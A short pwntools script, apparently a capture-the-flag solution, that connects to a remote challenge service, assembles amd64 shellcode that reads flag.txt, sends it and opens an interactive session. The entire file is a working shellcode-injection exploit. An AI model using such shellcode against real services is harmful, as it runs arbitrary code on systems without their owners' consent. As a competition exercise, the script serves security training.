from pwn import *
r = remote("seccompagnia.ss2.ccit23.havce.it", 31361)

r.recvline()

testo = shellcraft.amd64.linux.cat2("flag.txt")
shellcode = asm(testo, arch='x86_64')

r.send(shellcode)

r.interactive()